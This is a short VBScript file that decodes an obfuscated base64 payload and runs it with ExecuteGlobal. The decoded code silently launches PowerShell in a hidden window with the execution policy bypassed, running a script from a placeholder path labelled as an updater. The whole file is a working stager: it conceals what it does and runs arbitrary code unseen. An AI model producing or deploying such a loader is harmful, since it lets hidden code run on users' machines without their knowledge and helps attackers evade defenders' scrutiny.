Dim sdewcvfa
sdewcvfa = ""
sdewcvfa = sdewcvfa & "TwBwAHQAaQBvAG4AIABFAHgAcABsAGkAYwBpAHQACgBEAGkAbQAgAG8AUwBoAGUAbABsACwAIABzAE"
sdewcvfa = sdewcvfa & "MAbQBkAAoAUwBlAHQAIABvAFMAaABlAGwAbAAgAD0AIABDAHIAZQBhAHQAZQBPAGIAagBlAGMAdAAo"
sdewcvfa = sdewcvfa & "ACIAVwBTAGMAcgBpAHAAdAAuAFMAaABlAGwAbAAiACkACgBzAEMAbQBkACAAPQAgACIAcABvAHcAZQ"
sdewcvfa = sdewcvfa & "ByAHMAaABlAGwAbAAuAGUAeABlACAALQBOAG8AUAByAG8AZgBpAGwAZQAgAC0ATgBvAG4ASQBuAHQA"
sdewcvfa = sdewcvfa & "ZQByAGEAYwB0AGkAdgBlACAALQBXAGkAbgBkAG8AdwBTAHQAeQBsAGUAIABIAGkAZABkAGUAbgAgAC"
sdewcvfa = sdewcvfa & "0ARQB4AGUAYwB1AHQAaQBvAG4AUABvAGwAaQBjAHkAIABCAHkAcABhAHMAcwAgAC0ARgBpAGwAZQAg"
sdewcvfa = sdewcvfa & "ACIAIgAlACUAVQBQAEQAQQBUAEUAUgBfAFAAUwAxAF8AUABBAFQASAAlACUAIgAiACIACgBvAFMAaA"
sdewcvfa = sdewcvfa & "BlAGwAbAAuAFIAdQBuACAAcwBDAG0AZAAsACAAMAAsACAAVAByAHUAZQAKAFMAZQB0ACAAbwBTAGgA"
sdewcvfa = sdewcvfa & "ZQBsAGwAIAA9ACAATgBvAHQAaABpAG4AZwA="
Dim tjkoccdw : Set tjkoccdw = CreateObject("ADODB.Stream")
tjkoccdw.Type = 1 : tjkoccdw.Open
Dim fzesqotg : Set fzesqotg = CreateObject("MSXml2.DOMDocument").createElement("z")
fzesqotg.dataType = "bin.base64" : fzesqotg.text = sdewcvfa
tjkoccdw.Write fzesqotg.nodeTypedValue
tjkoccdw.Position = 0 : tjkoccdw.Type = 2 : tjkoccdw.Charset = "UTF-16LE"
Dim lfspxsqd : lfspxsqd = tjkoccdw.ReadText : tjkoccdw.Close
ExecuteGlobal lfspxsqd